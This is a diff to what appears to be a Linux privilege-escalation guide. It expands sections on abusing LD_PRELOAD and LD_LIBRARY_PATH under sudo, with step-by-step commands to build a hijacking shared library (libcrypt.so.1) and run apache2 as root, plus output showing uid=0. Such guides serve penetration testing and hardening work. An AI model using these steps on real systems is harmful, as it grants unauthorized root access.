@@ -1055,7 +1055,7 @@ export -f /usr/sbin/service
 Then, when you call the suid binary, this function will be executed
 
 ### LD\_PRELOAD & **LD\_LIBRARY\_PATH**
-
+#### LD_PRELOAD
 The **LD\_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.
 
 However, to maintain system security and prevent this feature from being exploited, particularly with **suid/sgid** executables, the system enforces certain conditions:
@@ -1063,7 +1063,13 @@ However, to maintain system security and prevent this feature from being exploit
 * The loader disregards **LD\_PRELOAD** for executables where the real user ID (_ruid_) does not match the effective user ID (_euid_).
 * For executables with suid/sgid, only libraries in standard paths that are also suid/sgid are preloaded.
 
-Privilege escalation can occur if you have the ability to execute commands with `sudo` and the output of `sudo -l` includes the statement **env\_keep+=LD\_PRELOAD**. This configuration allows the **LD\_PRELOAD** environment variable to persist and be recognized even when commands are run with `sudo`, potentially leading to the execution of arbitrary code with elevated privileges.
+Privilege escalation can occur if you have the ability to execute commands with `sudo` and the output of `sudo -l` includes the statement **env\_keep+=LD\_PRELOAD**. 
+```bash
+sudo -l
+Matching Defaults entries for user on this host:
+env_reset, env_keep+=LD_PRELOAD,......
+```
+This configuration allows the **LD\_PRELOAD** environment variable to persist and be recognized even when commands are run with `sudo`, potentially leading to the execution of arbitrary code with elevated privileges.
 
 ```
 Defaults        env_keep += LD_PRELOAD
@@ -1097,9 +1103,30 @@ Finally, **escalate privileges** running
 sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
 ```
 
-{% hint style="danger" %}
+#### LD_LIBRARY_PATH
+The LD_LIBRARY_PATH environment variable contains a set of directories where shared libraries are searched for first.
+
 A similar privesc can be abused if the attacker controls the **LD\_LIBRARY\_PATH** env variable because he controls the path where libraries are going to be searched.
-{% endhint %}
+
+The ldd command can be used to print the shared libraries used by a program:
+`ldd /usr/sbin/apache2`
+
+By creating a shared library with the same name as one used by a program, and setting LD_LIBRARY_PATH to its parent directory, the program will load our shared library instead.
+
+1. Run ldd against the apache2 program file:
+```bash
+ldd /usr/sbin/apache2
+linux-vdso.so.1 => (0x00007fff063ff000)
+...
+libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f7d4199d000)
+libdl.so.2 => /lib/libdl.so.2 (0x00007f7d41798000)
+libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f7d41570000)
+/lib64/ld-linux-x86-64.so.2 (0x00007f7d42e84000)
+```
+Hijacking shared objects using this method is hit or miss. Choose one from
+the list and try it (libcrypt.so.1 seems to work well).
+
+2. Create a file (library_path.c) with the following contents:
 
 ```c
 #include <stdio.h>
@@ -1114,13 +1141,21 @@ void hijack() {
 }
 ```
 
+3. Compile library_path.c into libcrypt.so.1: 
 ```bash
 # Compile & execute
 cd /tmp
 gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
-sudo LD_LIBRARY_PATH=/tmp <COMMAND>
 ```
-
+4. Run apache2 using sudo, while setting the LD_LIBRARY_PATH environment variable to the current path (where we compiled library_path.c):
+```bash
+#sudo LD_LIBRARY_PATH=/tmp <COMMAND>
+sudo LD_LIBRARY_PATH=. apache2
+```
+```bash
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
 ### SUID Binary – .so injection
 
 When encountering a binary with **SUID** permissions that seems unusual, it's a good practice to verify if it's loading **.so** files properly. This can be checked by running the following command:
